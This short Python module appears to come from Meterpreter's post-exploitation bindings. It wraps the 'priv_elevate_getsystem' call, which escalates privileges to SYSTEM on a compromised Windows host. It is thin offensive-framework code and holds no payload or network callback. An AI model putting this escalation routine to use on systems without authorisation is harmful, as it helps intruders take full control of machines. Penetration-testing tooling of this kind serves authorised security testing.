import meterpreter_bindings

from meterpreter.core import *

TLV_PRIV_EXTENSION = 20000

TLV_TYPE_ELEVATE_TECHNIQUE = TLV_TYPE_META_TYPE_UINT | (TLV_PRIV_EXTENSION + 200)

def getsystem(technique = 0):
  required = ['priv_elevate_getsystem']
  core.validate_bindings(required)

  tlv = core.tlv_pack(TLV_TYPE_ELEVATE_TECHNIQUE)
  meterpreter_bindings.priv_elevate_getsystem(tlv)
